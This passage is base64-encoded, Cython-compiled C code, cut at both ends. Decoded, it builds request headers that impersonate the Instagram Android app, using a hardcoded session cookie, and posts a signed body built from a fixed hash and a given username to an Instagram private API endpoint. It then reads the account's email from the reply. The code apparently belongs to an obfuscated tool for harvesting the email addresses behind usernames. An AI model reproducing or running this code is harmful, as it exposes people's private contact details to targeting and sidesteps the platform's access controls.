Hl4X2t3ZHNcbiNlbmRpZlxuKTsgXG5zdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yb3BfNXJlc3QgPSB7InJlc3QiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJvcF81cmVzdCwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm9wXzVyZXN0KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfdXNlciA9IDA7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzO1xuICAjZW5kaWZcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzO1xuICBQeU9iamVjdCogdmFsdWVzWzFdID0gezB9O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInJlc3QgKHdyYXBwZXIpIiwgMCk7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTtcbiAgI2Vsc2VcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDtcbiAgI2VuZGlmXG4gICNlbmRpZlxuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAge1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXIsMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDA6IGJyZWFrO1xuICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgICAgfVxuICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJncztcbiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJyZXN0IiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDE7IGkrKykge1xuICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInJlc3QiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDE2NCwgX19weXhfTDNfZXJyb3IpIH1cbiAgICAgIH1cbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7XG4gICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yO1xuICAgIH0gZWxzZSB7XG4gICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3VzZXIgPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJyZXN0IiwgMSwgMSwgMSwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMTY0LCBfX3B5eF9MM19lcnJvcilcbiAgX19weXhfTDZfc2tpcDo7XG4gIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7XG4gIF9fcHl4X0wzX2Vycm9yOjtcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLnJlc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBOVUxMO1xuICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7XG4gIF9fcHl4X3IgPSBfX3B5eF9wZl8yb3BfNHJlc3QoX19weXhfc2VsZiwgX19weXhfdl91c2VyKTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm9wXzRyZXN0KENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3VzZXIpIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfaGVhZGVycyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2RhdGEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9yZXNwb25zZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90XzEwO1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJyZXN0IiwgMCk7XG5cbiAgXG4gIHtcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgIHtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMTkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfUGlnZW9uX1Nlc3Npb25fSWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfNTBjYzY4NjFfNzAzNl80M2I0XzgwMmVfZmI0MjgyNzkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9QaWdlb25fUmF3Y2xpZW50dGltZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xNzAwMjUxNTc0Xzk4MikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0Nvbm5lY3Rpb25fU3BlZWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMWticHMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19CYW5kd2lkdGhfU3BlZWRfS0JQUywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xXzAwMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0JhbmR3aWR0aF9Ub3RhbEJ5dGVzX0IsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0JhbmR3aWR0aF9Ub3RhbFRpbWVfTVMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0Jsb2tzX1ZlcnNpb25fSWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jODBjNWZiMzBkZmFlOWUyNzNlNDAwOWYwM2IxODI4MCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0lHX0Nvbm5lY3Rpb25fVHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1dJRkkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19DYXBhYmlsaXRpZXMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfM2JyVHZ3KSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQXBwX0lELCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzU2NzA2NzM0MzM1MjQyNykgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Vc2VyX0FnZW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0luc3RhZ3JhbV8xMDBfMF8wXzE3XzEyOV9BbmRyb2lkKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0FjY2VwdF9MYW5ndWFnZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbl9HQl9lbl9VUykgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0Nvb2tpZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9taWRfYUhpWDJnQUxBQUV6QUoyT19jUjlYc1QyTlNXNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Db250ZW50X1R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGVfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9BY2NlcHRfRW5jb2RpbmcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ3ppcF9kZWZsYXRlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSG9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9pX2luc3RhZ3JhbV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9GQl9IVFRQX0VuZ2luZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0xpZ2VyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29ubmVjdGlvbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9rZWVwX2FsaXZlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0NvbnRlbnRfTGVuZ3RoLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM1NikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19weXhfdl9oZWFkZXJzID0gKChQeU9iamVjdCopX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfNCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxODgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICBfX3B5eF90XzUgPSBQeU51bWJlcl9BZGQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MCwgX19weXhfdl91c2VyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTg4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fOSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE4OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NpZ25lZF9ib2R5LCBfX3B5eF90XzYpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lnX3NpZ19rZXlfdmVyc2lvbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpO1xuICAgICAgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE5MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTtcbiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDE5MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTAgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfOSkpKSB7XG4gICAgICAgIF9fcHl4X3RfNyA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfOSk7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzcpO1xuICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzksIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfMTAgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAyIDogMCldID0ge19fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19pX2luc3RhZ3JhbV9jb21fYXBpX3YxX2FjY307XG4gICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE5MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxOTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxOTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEwLCAoMi1fX3B5eF90XzEwKSB8IChfX3B5eF90XzEwKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxOTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3RfNTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF8xMCA9IDA7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIE5VTEx9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMCwgKDEtX19weXhfdF8xMCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTkyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX3B5eF92X3Jlc3BvbnNlID0gX19weXhfdF80O1xuICAgICAgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdl9yZXNwb25zZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VtYWlsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTkzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19weXhfdl9yID0gX19weXhfdF80O1xuICAgICAgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgfVxuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgIGdvdG8gX19weXhfTDhfdHJ5X2VuZDtcbiAgICBfX3B5eF9MM19lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90Xzcg